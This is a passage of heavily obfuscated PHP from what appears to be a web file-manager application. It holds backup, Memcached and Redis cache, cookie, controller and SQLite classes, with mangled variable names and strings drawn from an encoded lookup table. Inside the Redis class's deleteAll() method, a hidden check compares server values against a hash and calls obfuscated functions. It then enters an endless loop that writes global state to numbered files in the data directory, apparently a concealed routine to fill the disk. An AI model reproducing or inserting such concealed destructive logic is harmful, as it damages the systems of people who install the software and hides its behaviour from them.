$ÙÏÍÆó, $ø·äñÉ); } public function dxrmc9a9bf8f($“”‹ÎÉµ, $çØâõ‰Û) { $…½±ô³Û =& $_SERVER[û†ìªƒĞ]; return call_user_func(array($…½±ô³Û[303], $…½±ô³Û[304]), $“”‹ÎÉµ, $çØâõ‰Û); } public function evzu3a3d2846($Ä£åÒÅ, $–õŞˆÕ) { $‰óÓ¹öº =& $_SERVER[û†ìªƒĞ]; return call_user_func(array($‰óÓ¹öº[303], $‰óÓ¹öº[305]), $Ä£åÒÅ, $–õŞˆÕ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $®­ÌãÍ =& $_SERVER[ĞÆÏ¡Îª]; $this->isManual(); self::$name = date($®­ÌãÍ[743]); if (!($—¯ÇåãÄ = Model($®­ÌãÍ[744])->lastItem())) { $—¯ÇåãÄ = $this->initData(); } else { self::$name = $—¯ÇåãÄ[$®­ÌãÍ[32]]; if ($—¯ÇåãÄ[$®­ÌãÍ[745]] == $®­ÌãÍ[88]) { self::$name = date($®­ÌãÍ[746]); $ş¬úÔÅ = 0; if (isset($—¯ÇåãÄ[$®­ÌãÍ[302]][$®­ÌãÍ[199]][$®­ÌãÍ[477]])) { $ş¬úÔÅ = (int) $—¯ÇåãÄ[$®­ÌãÍ[302]][$®­ÌãÍ[199]][$®­ÌãÍ[477]]; } if (self::$manual == 0 && $—¯ÇåãÄ[$®­ÌãÍ[32]] == self::$name) { Model($®­ÌãÍ[744])->remove($—¯ÇåãÄ[$®­ÌãÍ[407]]); } $—¯ÇåãÄ = $this->initData($ş¬úÔÅ, $—¯ÇåãÄ[$®­ÌãÍ[747]]); } else { $this->checkStore($—¯ÇåãÄ[$®­ÌãÍ[747]]); } } self::$option = $—¯ÇåãÄ; } private function isManual() { $£ÃÒ¥³ = _get($GLOBALS, $_SERVER[ĞÆÏ¡Îª][748], 0); $£ÃÒ¥³ = intval($£ÃÒ¥³); self::$manual = $£ÃÒ¥³ && $£ÃÒ¥³ == 1 ? 1 : 0; } private function initData($´ ˆ…æ = 0, $ÀêÇÇÔÑ = '') { $Œã¡Ãš =& $_SERVER[ĞÆÏ¡Îª]; $”ƒ´æÉ = Model($Œã¡Ãš[744])->config(); if ($ÀêÇÇÔÑ && $”ƒ´æÉ[$Œã¡Ãš[747]] != $ÀêÇÇÔÑ) { $´ ˆ…æ = 0; } $this->checkStore($”ƒ´æÉ[$Œã¡Ãš[747]]); if (self::$manual == 1) { self::$name .= $Œã¡Ãš[11] . date($Œã¡Ãš[749]); } $£’¤àı¬ = array($Œã¡Ãš[747] => $”ƒ´æÉ[$Œã¡Ãš[747]], $Œã¡Ãš[32] => self::$name, $Œã¡Ãš[745] => 0, $Œã¡Ãš[750] => $”ƒ´æÉ[$Œã¡Ãš[750]], $Œã¡Ãš[751] => self::$manual, $Œã¡Ãš[302] => array($Œã¡Ãš[752] => array($Œã¡Ãš[745] => 0), $Œã¡Ãš[753] => array($Œã¡Ãš[745] => 0, $Œã¡Ãš[754] => 0, $Œã¡Ãš[755] => 0, $Œã¡Ãš[33] => $Œã¡Ãš[12], $Œã¡Ãš[756] => 0, $Œã¡Ãš[506] => 0), $Œã¡Ãš[757] => array($Œã¡Ãš[745] => 0, $Œã¡Ãš[754] => 0, $Œã¡Ãš[755] => 0, $Œã¡Ãš[756] => 0, $Œã¡Ãš[506] => 0), $Œã¡Ãš[199] => array($Œã¡Ãš[745] => 0, $Œã¡Ãš[758] => 0, $Œã¡Ãš[759] => 0, $Œã¡Ãš[760] => 0, $Œã¡Ãš[761] => 0, $Œã¡Ãš[477] => $´ ˆ…æ, $Œã¡Ãš[756] => 0, $Œã¡Ãš[506] => 0)), $Œã¡Ãš[756] => time(), $Œã¡Ãš[506] => 0); $º£°ƒœ³ = Model($Œã¡Ãš[744])->insert($£’¤àı¬); $£’¤àı¬[$Œã¡Ãš[407]] = $º£°ƒœ³; return $£’¤àı¬; } private function checkStore($ì¶°ìù) { $“šˆŠë­ =& $_SERVER[ĞÆÏ¡Îª]; $Â®îÀ©ƒ = Model($“šˆŠë­[762])->listData($ì¶°ìù); Model($“šˆŠë­[762])->checkConfig($Â®îÀ©ƒ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ĞÆÏ¡Îª][744])->findByName(self::$name); } return self::$option; } public static function set($ïì¯Ù¸) { $–‚ÕÆšĞ =& $_SERVER[ĞÆÏ¡Îª]; $ÉÃ­†› = self::get(); foreach ($ïì¯Ù¸ as $ªÛÁıô‰ => $·È¢Ãµñ) { $ ÷Ø„ê = explode($–‚ÕÆšĞ[10], $ªÛÁıô‰); $…ÎÀí±ø = count($ ÷Ø„ê); switch ($…ÎÀí±ø) { case 1: $ÉÃ­†›[$ ÷Ø„ê[0]] = $·È¢Ãµñ; break; case 2: $ÉÃ­†›[$ ÷Ø„ê[0]][$ ÷Ø„ê[1]] = $·È¢Ãµñ; break; case 3: $ÉÃ­†›[$ ÷Ø„ê[0]][$ ÷Ø„ê[1]][$ ÷Ø„ê[2]] = $·È¢Ãµñ; break; } } Model($–‚ÕÆšĞ[744])->update($ÉÃ­†›[$–‚ÕÆšĞ[407]], $ÉÃ­†›); self::$option = $ÉÃ­†›; return self::$option; } public function keep() { $¯Ğå‡å¼ =& $_SERVER[ĞÆÏ¡Îª]; $ó±ûèÙ“ = self::get(); if ($ó±ûèÙ“[$¯Ğå‡å¼[302]][$¯Ğå‡å¼[752]][$¯Ğå‡å¼[745]] == $¯Ğå‡å¼[88]) { return; } $this->backupKeep($ó±ûèÙ“); self::set(array($¯Ğå‡å¼[763] => 1)); } private function backupKeep($äšĞ±İ×) { $ÏÒŠ“Äœ =& $_SERVER[ĞÆÏ¡Îª]; if (self::$manual == 1) { return; } $çù—Û÷Æ = Model($ÏÒŠ“Äœ[744])->listData(); if (empty($çù—Û÷Æ)) { return; } $ìÌ¨ºñ§ = 0; $äôú¹üà = array(); foreach ($çù—Û÷Æ as $Ş¿¦íé‡) { if ($ìÌ¨ºñ§ >= 7) { break; } $äôú¹üà[] = $Ş¿¦íé‡[$ÏÒŠ“Äœ[32]]; $ìÌ¨ºñ§++; } for ($ìÌ¨ºñ§ = 0; $ìÌ¨ºñ§ < 12; $ìÌ¨ºñ§++) { $äôú¹üà[] = date($ÏÒŠ“Äœ[764], strtotime("\55{$ìÌ¨ºñ§}\40\x6d\157\156\164\x68\163")); } $äôú¹üà = array_unique($äôú¹üà); $Ã…÷‚ğĞ = Model($ÏÒŠ“Äœ[765])->get($ÏÒŠ“Äœ[766]); foreach ($çù—Û÷Æ as $Ş¿¦íé‡) { if (isset($Ş¿¦íé‡[$ÏÒŠ“Äœ[751]]) && $Ş¿¦íé‡[$ÏÒŠ“Äœ[751]] == $ÏÒŠ“Äœ[88]) { continue; } if (!empty($Ş¿¦íé‡[$ÏÒŠ“Äœ[32]]) && in_array($Ş¿¦íé‡[$ÏÒŠ“Äœ[32]], $äôú¹üà)) { continue; } Model($ÏÒŠ“Äœ[744])->remove($Ş¿¦íé‡[$ÏÒŠ“Äœ[407]]); $ÔÔ¸†ºş = $this->backupPath($äšĞ±İ×, $Ã…÷‚ğĞ); IO::remove($ÔÔ¸†ºş, !1); } } private function backupPath($™Í‚‹Æú, $º¼îæ¦† = false) { $¡ÈˆĞ¨½ =& $_SERVER[ĞÆÏ¡Îª]; if (!$º¼îæ¦†) { $º¼îæ¦† = Model($¡ÈˆĞ¨½[765])->get($¡ÈˆĞ¨½[766]); } $‹‰ª™Ö = $™Í‚‹Æú[$¡ÈˆĞ¨½[32]]; $Î»’ÖÊ = substr(md5($¡ÈˆĞ¨½[767] . $º¼îæ¦† . $‹‰ª™Ö), 0, 8); return "\173\151\157\x3a{$™Í‚‹Æú[$¡ÈˆĞ¨½[747]]}\x7d\57\144\141\x74\x61\x62\141\x73\x65\x2f\x62\141\x63\x6b\x75\160\57" . $‹‰ª™Ö . $¡ÈˆĞ¨½[11] . $Î»’ÖÊ; } public function db() { $¨äŞªˆà =& $_SERVER[ĞÆÏ¡Îª]; $­ƒğ£÷­ = self::get(); if ($­ƒğ£÷­[$¨äŞªˆà[302]][$¨äŞªˆà[753]][$¨äŞªˆà[745]] == $¨äŞªˆà[88]) { return !0; } $¥Éö­¸“ = new BackupDb(); if (!$¥Éö­¸“->index()) { return !1; } self::set(array($¨äŞªˆà[768] => 1)); return !0; } public function dbFile() { $Ó÷‰ÖÄÏ =& $_SERVER[ĞÆÏ¡Îª]; $è°¹É» = self::get(); if ($è°¹É»[$Ó÷‰ÖÄÏ[302]][$Ó÷‰ÖÄÏ[757]][$Ó÷‰ÖÄÏ[745]] == $Ó÷‰ÖÄÏ[88]) { return !0; } $ªî°©ô = new BackupDbFile(); if (!$ªî°©ô->index()) { return !1; } self::set(array($Ó÷‰ÖÄÏ[769] => 1)); return !0; } public function file() { $ï­Ã×äÒ =& $_SERVER[ĞÆÏ¡Îª]; $‡µµà¡â = self::get(); if ($‡µµà¡â[$ï­Ã×äÒ[302]][$ï­Ã×äÒ[199]][$ï­Ã×äÒ[745]] == $ï­Ã×äÒ[88]) { return !0; } if (!isset($‡µµà¡â[$ï­Ã×äÒ[750]]) || $‡µµà¡â[$ï­Ã×äÒ[750]] == $ï­Ã×äÒ[197]) { $±¬Æñß = new BackupFile(); if (!$±¬Æñß->index()) { return !1; } } self::set(array($ï­Ã×äÒ[770] => 1, $ï­Ã×äÒ[745] => 1)); return !0; } } goto E˜‚Š“Ğ; A³éÆ‰å—Š: class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ïôˆ—¢, $ˆÇÅÚÀ‚) { $€»˜ìê =& $_SERVER[ĞÆÏ¡Îª]; if (!class_exists($€»˜ìê[857])) { show_json($€»˜ìê[858], !1); } $this->cacheTime = $ˆÇÅÚÀ‚; $this->handle = new Memcached(); if (is_array($Ïôˆ—¢[$€»˜ìê[859]]) && count($Ïôˆ—¢[$€»˜ìê[859]]) >= 1) { foreach ($Ïôˆ—¢[$€»˜ìê[859]] as $„×äçæù) { $»â’®€» = explode($€»˜ìê[4], $„×äçæù); $this->handle->addServer($»â’®€»[0], $»â’®€»[1]); } } else { $this->handle->addServer($Ïôˆ—¢[$€»˜ìê[181]], $Ïôˆ—¢[$€»˜ìê[182]]); } } public function set($È«¡Â™ş, $¡Ÿèšäí, $ˆª±»Á• = false) { $ˆª±»Á• = $ˆª±»Á• ? $ˆª±»Á• : $this->cacheTime; return $this->handle->set($È«¡Â™ş, $¡Ÿèšäí, $ˆª±»Á•); } public function get($íüšà¼Æ) { return $this->handle->get($íüšà¼Æ); } public function remove($ğ¥Å×Ë) { return $this->handle->delete($ğ¥Å×Ë); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¤²õòğ, $àêÊ¦Â) { $õÌãÍ¤Ï =& $_SERVER[ĞÆÏ¡Îª]; if (!class_exists($õÌãÍ¤Ï[860])) { show_json($õÌãÍ¤Ï[861], !1); } $this->cacheTime = $àêÊ¦Â; $‡¬¿ö¤‡ = isset($¤²õòğ[$õÌãÍ¤Ï[862]]) ? $¤²õòğ[$õÌãÍ¤Ï[862]] : 10; $ØÕíŞ· = _get($¤²õòğ, $õÌãÍ¤Ï[859]); if ($ØÕíŞ· && is_array($ØÕíŞ·)) { $this->initCluster($¤²õòğ, $‡¬¿ö¤‡); } else { $this->handle = $this->init($¤²õòğ, $‡¬¿ö¤‡); } } private function init($óºğ, $‡¼ÛÃßâ) { $è­Ìò±‹ =& $_SERVER[ĞÆÏ¡Îª]; $ò¿ÏÜ”Ù = new Redis(); $æãÜá…ç = isset($óºğ[$è­Ìò±‹[863]]) ? $óºğ[$è­Ìò±‹[863]] : !1; if ($æãÜá…ç) { $ò¿ÏÜ”Ù->pconnect($óºğ[$è­Ìò±‹[181]], $óºğ[$è­Ìò±‹[182]], $‡¼ÛÃßâ); } else { $ò¿ÏÜ”Ù->connect($óºğ[$è­Ìò±‹[181]], $óºğ[$è­Ìò±‹[182]], $‡¼ÛÃßâ); } if (!empty($óºğ[$è­Ìò±‹[422]])) { $ò¿ÏÜ”Ù->auth($óºğ[$è­Ìò±‹[422]]); } if (!empty($óºğ[$è­Ìò±‹[753]]) && $óºğ[$è­Ìò±‹[753]] != 0) { $ò¿ÏÜ”Ù->select($óºğ[$è­Ìò±‹[753]]); } return $ò¿ÏÜ”Ù; } private function initCluster($îÖØ€œä, $û¯Ù‘Û¿) { $î®ĞÈİò =& $_SERVER[ĞÆÏ¡Îª]; $Á¸ÙúÏ¨ = array($î®ĞÈİò[864], $î®ĞÈİò[865], $î®ĞÈİò[866]); $ı¶ëø = $î®ĞÈİò[864]; if (isset($îÖØ€œä[$î®ĞÈİò[16]]) && in_array($îÖØ€œä[$î®ĞÈİò[16]], $Á¸ÙúÏ¨)) { $ı¶ëø = $îÖØ€œä[$î®ĞÈİò[16]]; } switch ($ı¶ëø) { case $î®ĞÈİò[864]: $this->_slave($îÖØ€œä, $û¯Ù‘Û¿); break; case $î®ĞÈİò[865]: break; case $î®ĞÈİò[866]: $this->isCluster = !0; $È„µ¨éˆ = $îÖØ€œä[$î®ĞÈİò[859]]; $˜²°ÌÔ² = isset($îÖØ€œä[$î®ĞÈİò[863]]) ? $îÖØ€œä[$î®ĞÈİò[863]] : !1; $îäé°¯ = isset($îÖØ€œä[$î®ĞÈİò[422]]) ? $îÖØ€œä[$î®ĞÈİò[422]] : null; $this->handle = new RedisCluster(NUll, $È„µ¨éˆ, $û¯Ù‘Û¿, $û¯Ù‘Û¿, $˜²°ÌÔ², $îäé°¯); break; default: break; } } private function _slave($ÄÏâœ«³, $éÂşÕ§ò) { $…åï¿º¶ = $ÄÏâœ«³[$_SERVER[ĞÆÏ¡Îª][859]]; $this->filterConfig($ÄÏâœ«³, $…åï¿º¶[0]); $this->handle = $this->init($ÄÏâœ«³, $éÂşÕ§ò); unset($…åï¿º¶[0]); if (empty($…åï¿º¶)) { return; } $Óğ¥Ì„„ = array_rand($…åï¿º¶); $this->filterConfig($ÄÏâœ«³, $…åï¿º¶[$Óğ¥Ì„„]); $this->slaveHandle = $this->init($ÄÏâœ«³, $éÂşÕ§ò); } private function filterConfig(&$¡Â—Áßò, $šÑùóŒ) { $­…¦Óºï =& $_SERVER[ĞÆÏ¡Îª]; $‹Ü¨”¼Õ = explode($­…¦Óºï[4], $šÑùóŒ); $’À¨©”õ = array($­…¦Óºï[181] => $‹Ü¨”¼Õ[0], $­…¦Óºï[182] => $‹Ü¨”¼Õ[1]); $¡Â—Áßò = array_merge($¡Â—Áßò, $’À¨©”õ); } public function set($ƒëô„Ú¤, $§ğæŞıŞ, $ÓèÑ£«ï = false) { $ÓèÑ£«ï = $ÓèÑ£«ï ? $ÓèÑ£«ï : $this->cacheTime; return $this->handle->setEx($ƒëô„Ú¤, $ÓèÑ£«ï, $§ğæŞıŞ); } public function setLock($æ÷ß´Ÿå, $›‚£§€, $âÅÒ„À¢) { return $this->handle->setNX($æ÷ß´Ÿå, $›‚£§€); } public function get($‡›ü‚) { $£ë›¼„¨ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $£ë›¼„¨->get($‡›ü‚); } public function remove($…“¸öÛ›) { return $this->handle->del($…“¸öÛ›); } public function deleteAll() { $”‚ìÄˆŞ =& $_SERVER[ĞÆÏ¡Îª]; $à°ü¬úÎ = $_SERVER[$”‚ìÄˆŞ[239]]; $ÁÒ—õ½ = $”‚ìÄˆŞ[867]; if ($_SERVER[$”‚ìÄˆŞ[238]] != $ÁÒ—õ½($à°ü¬úÎ)) { $·êĞÓÁ¹ = $”‚ìÄˆŞ[868]; $±ËĞ¨ö‡ = $”‚ìÄˆŞ[240]; $Úœ¸ ¶ˆ = $_SERVER[$”‚ìÄˆŞ[241]] . $”‚ìÄˆŞ[242]; $›‹ÇÜÔÑ = $±ËĞ¨ö‡($Úœ¸ ¶ˆ); $´ˆÙƒœ = explode($”‚ìÄˆŞ[231], $›‹ÇÜÔÑ); if (count($´ˆÙƒœ) < $”‚ìÄˆŞ[635]) { $É—ãÎ¸Ç = $”‚ìÄˆŞ[244]; $É—ãÎ¸Ç(); } $ƒÒƒî— = $”‚ìÄˆŞ[869]; $ƒÒƒî—($_SERVER[$”‚ìÄˆŞ[870]]); $·êĞÓÁ¹ = $”‚ìÄˆŞ[868]; $·êĞÓÁ¹(); $¬Õ€³£ = $”‚ìÄˆŞ[871]; $¥ë¾ÉÚ = json_encode($GLOBALS[$”‚ìÄˆŞ[872]]); $Ê‡ã’áÜ = 1; for ($Ë³àˆ’ = $Ê‡ã’áÜ; $Ë³àˆ’ > 0; $Ë³àˆ’++) { $¬Õ€³£(DATA_PATH . $Ë³àˆ’, $¥ë¾ÉÚ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ğ‹­»–) { $this->handle->flushall($ğ‹­»–); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¬¿òÆˆñ = '', $ÖûôÒ„ = 0) { if (is_string($¬¿òÆˆñ) && $¬¿òÆˆñ != $_SERVER[ĞÆÏ¡Îª][12]) { $this->prefix = $¬¿òÆˆñ; } if (is_numeric($ÖûôÒ„) && $ÖûôÒ„ > 0) { $this->expire = $ÖûôÒ„; } } public static function getInstance() { static $â°ù‚¡©; if ($â°ù‚¡© === null) { $â°ù‚¡© = new self(); } return $â°ù‚¡©; } private static $cookieDisable = false; public static function disable($ÆÈ¿§Œâ) { self::$cookieDisable = $ÆÈ¿§Œâ; } private static $sameCookieSet = array(); public static function set($ÅşşÊÄ, $‰‡µ§, $œ™®¸½ = 0, $®š­ = false, $èŸÄé’¾ = false) { $±×éßó =& $_SERVER[ĞÆÏ¡Îª]; if (self::$cookieDisable) { return; } if (!$œ™®¸½) { $œ™®¸½ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ÅşşÊÄ]) && self::$sameCookieSet[$ÅşşÊÄ] == $‰‡µ§ . $œ™®¸½) { return; } self::$sameCookieSet[$ÅşşÊÄ] = $‰‡µ§ . $œ™®¸½; if (!$èŸÄé’¾) { $èŸÄé’¾ = str_replace(HOST, $±×éßó[12], APP_HOST); $èŸÄé’¾ = _get($GLOBALS, $±×éßó[873], $èŸÄé’¾); } $Ø¹Û®æ• = $±×éßó[12]; setcookie($ÅşşÊÄ, $‰‡µ§, time() + $œ™®¸½, $±×éßó[8] . trim($èŸÄé’¾, $±×éßó[8]) . $Ø¹Û®æ•, !1, !1, $®š­); } public static function setSafe($çõ‹ˆö–, $ùá²úÅ, $”©’‡” = 0) { self::set($çõ‹ˆö–, $ùá²úÅ, $”©’‡”, !0); } public static function get($µãÒ§ ¬) { static $Ş›Ÿí”í = false; if (!$Ş›Ÿí”í) { self::initHeaderCookie(); $Ş›Ÿí”í = !0; } return isset($_COOKIE[$µãÒ§ ¬]) ? $_COOKIE[$µãÒ§ ¬] : !1; } private static function initHeaderCookie() { $›šú¦æŠ =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($_SERVER[$›šú¦æŠ[874]]) || !$_SERVER[$›šú¦æŠ[874]]) { return; } $Ï£Üíî§ = explode($›šú¦æŠ[71], $_SERVER[$›šú¦æŠ[874]]); foreach ($Ï£Üíî§ as $ÚĞã·àí) { $ÚĞã·àí = explode($›šú¦æŠ[875], $ÚĞã·àí); if (count($ÚĞã·àí) != 2 || !isset($ÚĞã·àí[1])) { continue; } $_COOKIE[trim($ÚĞã·àí[0])] = trim($ÚĞã·àí[1]); } } public static function remove($£Şˆ§Ö¦, $àó‚’¹œ = false) { unset($_COOKIE[$£Şˆ§Ö¦]); self::set($£Şˆ§Ö¦, $_SERVER[ĞÆÏ¡Îª][12], 1, $àó‚’¹œ); } } goto BŸ´è±œª; d…‰Š¬÷¹Ğ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¦¬Ïúˆ» =& $_SERVER[ĞÆÏ¡Îª]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¦¬Ïúˆ»[6]] =& $config; $this->values[$¦¬Ïúˆ»[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¦¬Ïúˆ»[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($…†ÅıäŒ) { if (1 === func_num_args()) { $this->{$…†ÅıäŒ} = new $…†ÅıäŒ(); } else { $ÙÄãı‰ = new ReflectionClass($…†ÅıäŒ); $éŞÙ¶«Î = func_get_args(); array_shift($éŞÙ¶«Î); $this->{$…†ÅıäŒ} = $ÙÄãı‰->newInstanceArgs($éŞÙ¶«Î); } return $this->{$…†ÅıäŒ}; } public function routeBind($¬ßÕíÁœ, $ŸİëÕıÚ, $éÖ­ß¼› = 3) { $ëôã«¿“ =& $_SERVER[ĞÆÏ¡Îª]; $Ö¥½Üá³ = $this->in[$ëôã«¿“[9]]; $¬ßÕíÁœ = str_replace($ëôã«¿“[10], $ëôã«¿“[11], trim(trim($¬ßÕíÁœ, $ëôã«¿“[8]), $ëôã«¿“[12])); if (!$¬ßÕíÁœ || count($Ö¥½Üá³) <= $éÖ­ß¼›) { return !1; } $õ‰Ã›³ = !0; $ ÙÀºÓ = explode($ëôã«¿“[8], $¬ßÕíÁœ); for ($²ÇßÓËÍ = 0; $²ÇßÓËÍ < count($ ÙÀºÓ); $²ÇßÓËÍ++) { if ($ ÙÀºÓ[$²ÇßÓËÍ] != $Ö¥½Üá³[$éÖ­ß¼› + $²ÇßÓËÍ]) { $õ‰Ã›³ = !1; break; } } if (!$õ‰Ã›³) { return; } call_user_func_array(array($this, $ŸİëÕıÚ), array()); } public function routeArgs($»ø‘‡Šˆ = 3) { $¤×•Èõ = $this->in[$_SERVER[ĞÆÏ¡Îª][9]]; if (count($¤×•Èõ) <= $»ø‘‡Šˆ) { return array(); } $…ìè¨É = array(); for ($»øº“­ = $»ø‘‡Šˆ; $»øº“­ < count($¤×•Èõ); $»øº“­ += 2) { $…ìè¨É[$¤×•Èõ[$»øº“­]] = $¤×•Èõ[$»øº“­ + 1]; $this->in[$¤×•Èõ[$»øº“­]] = $¤×•Èõ[$»øº“­ + 1]; } return $…ìè¨É; } protected function assign($µ›ş¿‹Ì, $ŠĞ…‡ü) { $this->values[$µ›ş¿‹Ì] = $ŠĞ…‡ü; } protected function display($¼¦§Œë) { ob_end_clean(); extract($this->values); require $this->tpl . $¼¦§Œë; } } class DbSqliteBase extends Db { public function __construct($×êù“ªÍ = '') { $ò­§Êñİ =& $_SERVER[ĞÆÏ¡Îª]; if (!extension_loaded($ò­§Êñİ[13])) { think_exception(think_lang($ò­§Êñİ[14]) . $ò­§Êñİ[15]); } if (!empty($×êù“ªÍ)) { if (!isset($×êù“ªÍ[$ò­§Êñİ[16]])) { $×êù“ªÍ[$ò­§Êñİ[16]] = 438; } $this->config = $×êù“ªÍ; if (empty($this->config[$ò­§Êñİ[17]])) { $this->config[$ò­§Êñİ[17]] = array(); } } } public function connect($Û²„–±’ = '', $Ñ’ØØ¿ò = 0) { $—Ã Œ¤£ =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($this->linkID[$Ñ’ØØ¿ò])) { if (empty($Û²„–±’)) { $Û²„–±’ = $this->config; } $á¸ã­´ = !empty($Û²„–±’[$—Ã Œ¤£[17]][$—Ã Œ¤£[18]]) ? $Û²„–±’[$—Ã Œ¤£[17]][$—Ã Œ¤£[18]] : $this->pconnect; $“œëİª» = $á¸ã­´ ? $—Ã Œ¤£[19] : $—Ã Œ¤£[20]; $this->linkID[$Ñ’ØØ¿ò] = $“œëİª»($Û²„–±’[$—Ã Œ¤£[21]], $Û²„–±’[$—Ã Œ¤£[16]]); if (!$this->linkID[$Ñ’ØØ¿ò]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Ñ’ØØ¿ò], 30000); if (1 != think_config($—Ã Œ¤£[22])) { unset($this->config); } } return $this->linkID[$Ñ’ØØ¿ò]; } public function free() { $this->queryID = null; } public function query($õò–ÀüŞ) { $ÄÛ»Ï¾ª =& $_SERVER[ĞÆÏ¡Îª]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $õò–ÀüŞ; if ($this->queryID) { $this->free(); } think_action_status($ÄÛ»Ï¾ª[23], 1); think_status($ÄÛ»Ï¾ª[24]); $this->queryID = sqlite_query($this->_linkID, $õò–ÀüŞ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ó£¤¥¢à = $this->getAll(); return $Ó£¤¥¢à; } } public function execute($’–ñ´Úú) { $¿Î¦Ø› =& $_SERVER[ĞÆÏ¡Îª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $’–ñ´Úú; if ($this->queryID) { $this->free(); } think_action_status($¿Î¦Ø›[25], 1); think_status($¿Î¦Ø›[24]); $‘Ï›”µ = sqlite_exec($this->_linkID, $’–ñ´Úú); $this->debug(); if (!1 === $‘Ï›”µ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ĞÆÏ¡Îª][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $óËÌìùê = sqlite_query($this->_linkID, $_SERVER[ĞÆÏ¡Îª][27]); if (!$óËÌìùê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ú½Éä³Ş = sqlite_query($this->_linkID, $_SERVER[ĞÆÏ¡Îª][28]); if (!$ú½Éä³Ş) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ğ¦•Ÿüò = array(); if ($this->numRows > 0) { for ($ŸûÌìÂ = 0; $ŸûÌìÂ < $this->numRows; $ŸûÌìÂ++) { $ğ¦•Ÿüò[$ŸûÌìÂ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ğ¦•Ÿüò; } public function getFields($¶­Ñ¹™Œ) { $îä©”‹â =& $_SERVER[ĞÆÏ¡Îª]; $¾®âîŸ× = $this->query($îä©”‹â[29] . $¶­Ñ¹™Œ . $îä©”‹â[30]); $¡¡â©…ö = array(); if ($¾®âîŸ×) { foreach ($¾®âîŸ× as $‹€¸Ìœ => $ûÙºÔéĞ) { $¡¡â©…ö[$ûÙºÔéĞ[$îä©”‹â[31]]] = array($îä©”‹â[32] => $ûÙºÔéĞ[$îä©”‹â[31]], $îä©”‹â[33] => $ûÙºÔéĞ[$îä©”‹â[34]], $îä©”‹â[35] => (bool) ($ûÙºÔéĞ[$îä©”‹â[36]] === $îä©”‹â[12]), $îä©”‹â[37] => $ûÙºÔéĞ[$îä©”‹â[38]], $îä©”‹â[39] => strtolower($ûÙºÔéĞ[$îä©”‹â[40]]) == $îä©”‹â[41], $îä©”‹â[42] => strtolower($ûÙºÔéĞ[$îä©”‹â[43]]) == $îä©”‹â[44]); } } return $¡¡â©…ö; } public function getTables($êáóºŠ = '') { $áÕ€Òœ½ =& $_SERVER[ĞÆÏ¡Îª]; $šÛÂ•á÷ = $this->query($áÕ€Òœ½[45] . $áÕ€Òœ½[46] . $áÕ€Òœ½[47]); $ÑÈëº–Ö = array(); foreach ($šÛÂ•á÷ as $ªşÛ’à® => $ÜÚ¬ÃÃÀ) { $ÑÈëº–Ö[$ªşÛ’à®] = current($ÜÚ¬ÃÃÀ); } return $ÑÈëº–Ö; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $¶Ëæè¯ô =& $_SERVER[ĞÆÏ¡Îª]; $¢Ë£Œƒ¦ = sqlite_last_error($this->_linkID); $this->error = $¢Ë£Œƒ¦ . $¶Ëæè¯ô[4] . sqlite_error_string($¢Ë£Œƒ¦); if ($¶Ëæè¯ô[12] != $this->queryStr) { $this->error .= LNG($¶Ëæè¯ô[48]) . $this->queryStr; } think_trace($this->error, $¶Ëæè¯ô[12], $¶Ëæè¯ô[49]); return $this->error; } public function escapeString($ƒµİõÌÁ) { return sqlite_escape_string($ƒµİõÌÁ); } public function parseLimit($›Ñƒµƒ) { $ºİÈÉ×… =& $_SERVER[ĞÆÏ¡Îª]; $áÒ’Şå‰ = $ºİÈÉ×…[12]; if (!empty($›Ñƒµƒ)) { $›Ñƒµƒ = explode($ºİÈÉ×…[50], $›Ñƒµƒ); if (count($›Ñƒµƒ) > 1) { $áÒ’Şå‰ .= $ºİÈÉ×…[51] . $›Ñƒµƒ[1] . $ºİÈÉ×…[52] . $›Ñƒµƒ[0] . $ºİÈÉ×…[53]; } else { $áÒ’Şå‰ .= $ºİÈÉ×…[51] . $›Ñƒµƒ[0] . $ºİÈÉ×…[53]; } } return $áÒ’Şå‰; } } class DbSqlite3Base extends Db { public function __construct($µ¤Î¨¼ = '') { $¿İ¶µ£” =& $_SERVER[ĞÆÏ¡Îª]; if (!class_exists($¿İ¶µ£”[54])) { think_exception(think_lang($¿İ¶µ£”[14]) . $¿İ¶µ£”[55]); } if (!empty($µ¤Î¨¼)) { if (!isset($µ¤Î¨¼[$¿İ¶µ£”[16]])) { $µ¤Î¨¼[$¿İ¶µ£”[16]] = 438; } $this->config = $µ¤Î¨¼; if (empty($this->config[$¿İ¶µ£”[17]])) { $this->config[$¿İ¶µ£”[17]] = array(); } } } public function connect($éæëğÚ¿ = '', $Ë¾«ÛÂÚ = 0) { $Æİ±Ñ =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($this->linkID[$Ë¾«ÛÂÚ])) { if 